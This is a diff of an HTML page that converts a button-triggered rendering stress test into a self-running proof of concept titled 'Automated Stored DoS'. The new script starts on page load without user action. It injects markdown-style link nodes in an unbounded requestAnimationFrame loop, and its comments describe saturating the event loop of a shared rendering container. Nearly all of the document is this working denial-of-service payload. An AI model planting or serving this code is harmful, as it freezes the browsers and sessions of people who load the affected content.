@@ -2,33 +2,34 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Research: Rendering Stress Test</title>
+    <title>PoC: Automated Stored DoS</title>
     <style>
-        body { background: #121212; color: #eee; font-family: monospace; padding: 20px; }
-        #stream-output { border: 1px solid #444; height: 300px; overflow-y: scroll; padding: 10px; }
+        body { background: #000; color: #0f0; font-family: monospace; }
+        #render-target { height: 100vh; overflow: hidden; }
     </style>
 </head>
 <body>
-    <h3>Targeted Rendering Stress Test</h3>
-    <div id="stream-output"></div>
-    <button onclick="startStressTest()">Trigger High-Frequency Injection</button>
+    <div id="render-target"></div>
 
     <script>
-        async function startStressTest() {
-            const output = document.getElementById('stream-output');
-            // This loop forces the browser to handle rapid DOM updates
-            // simulating the "Race Condition" in the TqqUIc container
-            for (let i = 0; i < 1000; i++) {
-                const chunk = document.createElement('div');
-                chunk.innerHTML = `[Token_${i}](https://google.com) - Content_Hash: ${Math.random()}`;
-                output.appendChild(chunk);
-                
-                // Minimal delay to keep the rendering engine saturated
-                if (i % 10 === 0) {
-                    await new Promise(r => setTimeout(r, 1));
-                }
+        // Automatic execution upon load (simulating a shared resource load)
+        const target = document.getElementById('render-target');
+        let counter = 0;
+
+        function injectPayload() {
+            for (let i = 0; i < 50; i++) { // Increase density per frame
+                const node = document.createElement('div');
+                // Creating complex markdown structures to maximize parsing load
+                node.innerHTML = `[System_Token_${counter++}](https://google.com/search?q=${Math.random()})`;
+                target.appendChild(node);
             }
+            
+            // Unbounded recursive loop to saturate the event loop
+            requestAnimationFrame(injectPayload);
         }
+
+        // Trigger immediately without waiting for user action
+        window.onload = injectPayload;
     </script>
 </body>
 </html>
